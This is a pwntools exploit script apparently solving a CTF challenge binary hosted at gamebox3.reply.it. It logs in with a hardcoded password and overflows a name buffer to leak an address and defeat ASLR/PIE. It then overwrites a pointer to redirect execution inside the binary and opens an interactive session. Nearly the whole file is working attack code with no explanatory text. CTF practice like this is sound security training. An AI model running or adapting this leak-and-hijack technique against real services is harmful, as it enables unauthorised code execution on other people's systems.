#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./challs --host gamebox3.reply.it --port 2692
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./challs')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'gamebox3.reply.it'
port = int(args.PORT or 2692)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.sendlineafter(b"Passwd:", b"secret_passwd_anti_bad_guys")
io.sendlineafter(b">", b"Rename")
io.sendlineafter(b"name", b"A"*16)
io.sendlineafter(b">", b"GetName")
io.recvuntil(b"called: " + b"A"*16)

aslr_leak = u64(io.recvline()[:-1].ljust(8, b"\x00"))
base = aslr_leak - 0x40D0

io.sendlineafter(b">", b"Rename")
io.sendlineafter(b"name", b"A"*24 + p64(base+0x4160))

#gdb.attach(io)
io.sendlineafter(b">", b"Jump")
io.sendlineafter(b">", b"Rename")
io.sendlineafter(b"name", p64(base+0x1886))

print("ASLR leak: {}".format(hex(aslr_leak)))
io.interactive()